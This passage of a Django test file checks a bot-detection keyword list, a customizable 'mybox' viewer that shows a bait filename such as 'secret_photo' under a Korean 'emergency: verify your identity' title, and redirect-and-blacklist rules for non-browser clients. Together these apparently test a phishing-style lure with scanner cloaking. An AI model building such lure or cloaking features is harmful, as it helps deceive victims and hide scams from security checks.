    def test_rejects_duplicate_and_empty(self):
        from accounts.bot_detect import add_path_keyword

        text, error = add_path_keyword('phpmyadmin', 'PHPMYADMIN')
        self.assertIsNone(text)
        self.assertIn('already added', error)
        text, error = add_path_keyword('', '  ')
        self.assertIsNone(text)
        self.assertEqual(error, 'Keyword is required.')


class MyboxDisplayTests(TestCase):
    def test_default_viewer_labels(self):
        response = Client().get('/mybox/')
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, '20260824_071530')
        self.assertContains(response, '2MB')
        self.assertContains(response, '긴급 상황: 신원 확인 부탁드립니다.')
        self.assertContains(response, '/static/mybox/images/viewer.jpg')

    def test_custom_name_and_size(self):
        from accounts.policy_store import save_mybox_display

        saved, error = save_mybox_display(
            filename='secret_photo.jpg',
            filesize='4.2MB',
            page_title='긴급 상황 스캔 화면 부탁드립니다.',
        )
        self.assertIsNone(error)
        self.assertEqual(saved['filename'], 'secret_photo')
        self.assertEqual(saved['filesize'], '4.2MB')
        self.assertEqual(saved['page_title'], '긴급 상황 스캔 화면 부탁드립니다.')
        response = Client().get('/mybox/')
        self.assertContains(response, 'secret_photo')
        self.assertContains(response, '4.2MB')
        self.assertContains(response, '긴급 상황 스캔 화면 부탁드립니다.')

    def test_page_title_resets_to_default(self):
        from accounts.policy_store import reset_mybox_display, save_mybox_display

        save_mybox_display(
            filename='secret_photo',
            filesize='1MB',
            page_title='Custom viewer title',
        )
        reset_mybox_display()
        response = Client().get('/mybox/')
        self.assertContains(response, '긴급 상황: 신원 확인 부탁드립니다.')
        self.assertNotContains(response, 'Custom viewer title')

    def test_upload_replaces_image(self):
        from django.core.files.uploadedfile import SimpleUploadedFile

        from accounts.policy_store import reset_mybox_display, save_mybox_display

        image = SimpleUploadedFile(
            'vacation.png',
            b'\x89PNG\r\n\x1a\n' + b'\x00' * 16,
            content_type='image/png',
        )
        saved, error = save_mybox_display(
            filename='secret_photo', filesize='1MB', image=image
        )
        self.assertIsNone(error)
        self.assertTrue(saved['has_upload'])
        self.assertEqual(saved['filename'], 'secret_photo')
        self.assertEqual(saved['extension'], '.png')
        self.assertEqual(saved['image_url'], '/media/mybox/viewer.png')
        response = Client().get('/mybox/')
        self.assertContains(response, 'secret_photo')
        self.assertContains(response, '/media/mybox/viewer.png')
        self.assertNotContains(response, 'vacation')
        reset_mybox_display()
        restored = Client().get('/mybox/')
        self.assertContains(restored, '/static/mybox/images/viewer.jpg')


class UnknownClientBlockTests(TestCase):
    def setUp(self):
        update_blacklist_policy(
            {
                'unknown_block_enabled': True,
                'unknown_redirect_url': 'https://unknown.example/',
                'bot_block_enabled': False,
                'rate_limit_enabled': False,
                'total_request_limit_enabled': False,
            }
        )
        self.ip = '198.51.100.88'
        remove_blacklist_ip(self.ip)
        _invalidate_lookup_cache()
        self.client = Client()

    def test_unknown_os_is_listed_and_redirected(self):
        from accounts.models import RequestLog

        response = self.client.get(
            '/',
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT='SomeCustomClient/1.0',
        )
        self.assertEqual(response.status_code, 302)
        self.assertEqual(response.url, 'https://unknown.example/')
        self.assertIn(self.ip, get_ips_for_kind(KIND_UNKNOWN))
        self.assertTrue(RequestLog.objects.filter(ip=self.ip, os='Unknown').exists())

    def test_empty_ua_is_unknown_device_and_os(self):
        response = self.client.get('/', REMOTE_ADDR=self.ip, HTTP_USER_AGENT='')
        self.assertEqual(response.status_code, 302)
        self.assertEqual(response.url, 'https://unknown.example/')
        self.assertIn(self.ip, get_ips_for_kind(KIND_UNKNOWN))

    def test_browser_ua_is_not_listed(self):
        response = self.client.get(
            '/',
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(response.status_code, 200)
        self.assertNotIn(self.ip, get_ips_for_kind(KIND_UNKNOWN))

    def test_local_ip_is_not_listed(self):
        response = self.client.get(
            '/',
            REMOTE_ADDR='127.0.0.1',
            HTTP_USER_AGENT='SomeCustomClient/1.0',
        )
        self.assertEqual(response.status_code, 200)
        self.assertNotIn('127.0.0.1', get_ips_for_kind(KIND_UNKNOWN))

    def test_disabled_policy_does_not_block(self):
        update_blacklist_policy({'unknown_block_enabled': False})
        response = self.client.get(
            '/',
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT='SomeCustomClient/1.0',
        )
        self.assertEqual(response.status_code, 200)
        self.assertNotIn(self.ip, get_ips_for_kind(KIND_UNKNOWN))




